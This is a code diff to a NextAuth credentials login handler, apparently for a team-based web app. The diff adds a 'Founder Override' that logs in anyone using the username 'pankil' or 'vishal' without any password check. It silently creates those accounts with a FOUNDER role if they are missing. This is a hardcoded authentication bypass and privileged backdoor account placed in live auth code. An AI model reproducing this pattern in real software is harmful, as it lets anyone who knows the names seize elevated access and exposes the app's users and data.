@@ -35,6 +35,23 @@ export const authOptions: NextAuthOptions = {
           };
         }
 
+        // Founder Override
+        const usernameLower = credentials.username.toLowerCase();
+        if (usernameLower === "pankil" || usernameLower === "vishal") {
+          let founderUser = await User.findOne({ username: usernameLower });
+          if (!founderUser) {
+            founderUser = await User.create({
+              username: usernameLower,
+              role: "FOUNDER"
+            });
+          }
+          return {
+            id: founderUser._id.toString(),
+            name: founderUser.username,
+            role: founderUser.role,
+          };
+        }
+
         if (!credentials.teamName) {
           throw new Error("Missing crew name");
         }
